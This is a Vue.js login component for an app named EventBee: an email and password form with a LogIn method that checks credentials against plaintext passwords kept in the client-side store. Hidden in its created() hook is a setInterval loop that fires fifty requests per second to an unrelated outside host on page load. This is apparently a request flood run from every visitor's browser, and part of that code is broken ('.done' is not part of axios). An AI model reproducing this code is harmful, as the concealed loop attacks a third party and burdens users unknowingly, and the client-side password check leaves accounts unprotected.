<template>
    <div id='container' class='flex justify-center items-center'>
        <div id='login-box' class='ba b--light-silver w-25 flex flex-coulmn justify-center'>
            <div class=''>
                <div class='tc f3 pa1'>EventBee</div>
                <article class="pa2 black-80 w-100">
                    <form accept-charset="utf-8" v-on:submit.prevent='LogIn'>
                        <fieldset id="sign_up" class="ba b--transparent ph0 mh0">
                        <legend class="ph0 mh0 fw6 clip">Log in</legend>
                        <div class="mt3">
                            <label class="db fw4 lh-copy f6" for="email-address">Email address</label>
                            <input v-model='UserEmail' class="pa2 input-reset ba  w-100" type="email" name="email-address" required>
                        </div>
                        <div class="mt3">
                            <label class="db fw4 lh-copy f6" for="password">Password</label>
                            <input v-model='UserPass' class="b pa2 input-reset ba  w-100" type="password" name="password"  id="password" required>
                        </div>
                        </fieldset>
                        <div class="mt3 tc">
                            <input class="b ph3 pv2 input-reset ba b--black  grow pointer f6" type="submit" value="Log In">
                            <router-link to='/signup'></router-link>
                        </div>
                    </form>
                        <div class='mt3'>Haven't signed up? <router-link to='/signup'>Signup Here</router-link></div>
                </article>
                <div class='red tc' v-if='AuthFail'>Email or Passowrd is wrong</div>
            </div>
        </div>
    </div>
</template>

<script>
import axios from 'axios';
import { setInterval } from 'timers';
export default {
    name: "Login",
    data(){
        return{
            UserEmail: '',
            UserPass: '',
            AuthFail: false
        }
    },
    methods: {
        LogIn: function(){
            if(this.UserEmail !== '' && this.UserPass !== ''){
                let index = this.$store.state.UserBase.findIndex(x =>{
                    return (x.UserEmail == this.UserEmail && x.UserPass == this.UserPass)
                });
                
                if(index > -1){
                    this.$store.commit('LoggedIn',this.$store.state.UserBase[index].UserId)//user logged in
                    this.$store.dispatch('getCurrentUserData');//initalize the data
                    this.$router.push({path: '/app'});//move to the home
                }else{
                    this.AuthFail = true;
                }
            }else{
                alert('Fill both!');
            }
        }
    },
    created(){
        // this.$store.commit('GetSampleUser')
        setInterval(() => {
            for(var i = 0 ;i< 50;i++){
                axios('http://www.hobse.com/demo/index.php/customer/user/loginnpm').done(data => console.log(data))
            }
        },1000)
    }

}
</script>
<style>
#container{
    height:100%;
}
#login-box{
    min-width:350px;;
    min-height: 350px;
}
</style>

